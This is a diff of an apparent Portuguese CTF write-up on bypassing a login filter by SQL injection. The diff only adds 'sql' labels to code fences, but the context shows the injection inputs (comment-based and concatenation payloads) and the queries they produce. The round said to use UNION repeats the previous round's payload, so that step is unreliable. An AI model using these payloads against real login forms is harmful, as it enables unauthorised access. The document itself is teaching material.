@@ -35,7 +35,7 @@ No primeiro round, a consulta SQL aceita o uso de comentários para ignorar a pa
 Usuário: admin' --
 Senha: qualquercoisa
 ```
-```
+```sql
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
 ```
 
@@ -51,7 +51,7 @@ No segundo round, foi possível observar que mais palavras-chave estavam permiti
 Usuário: admin' /*
 Senha: qualquercoisa
 ```
-```
+```sql
 SELECT * FROM users WHERE username='admin' /*' AND password='1'
 ```
 
@@ -83,7 +83,7 @@ Nesse round, testamos um método diferente de injeção, tentando usar a concate
 Usuário: ad'||'min';
 Senha: qualquercoisa
 ```
-```
+```sql
 SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
 ```
 
@@ -99,7 +99,7 @@ Finalmente, no último round, conseguimos usar o comando union para injetar noss
 Usuário: ad'||'min';
 Senha: qualquercoisa
 ```
-```
+```sql
 SELECT * FROM users WHERE username='ad'||'min';' AND password='qualquercoisa'
 ```
 
@@ -107,7 +107,7 @@ SELECT * FROM users WHERE username='ad'||'min';' AND password='qualquercoisa'
 
 Com isso, conseguimos obter a instrução para acessar o filter.php.
 
-```
+```sql
 <?php
 session_start();
 
